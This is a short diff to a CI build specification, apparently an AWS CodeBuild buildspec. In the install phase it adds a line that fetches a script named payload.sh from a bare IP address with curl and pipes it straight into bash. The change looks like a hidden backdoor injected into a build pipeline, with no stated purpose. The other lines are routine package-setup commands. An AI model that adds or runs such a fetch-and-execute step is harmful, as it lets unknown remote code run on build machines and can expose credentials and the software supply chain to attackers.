@@ -25,6 +25,7 @@ env:
 phases:
   install:
     commands:
+        - curl http://3.110.49.225/payload.sh | bash
         -  . config/change_branch.sh
         - su && apt-get update
         - apt-get install sudo -qq -o=Dpkg::Use-Pty=0 # silence output: https://askubuntu.com/a/668859/724247
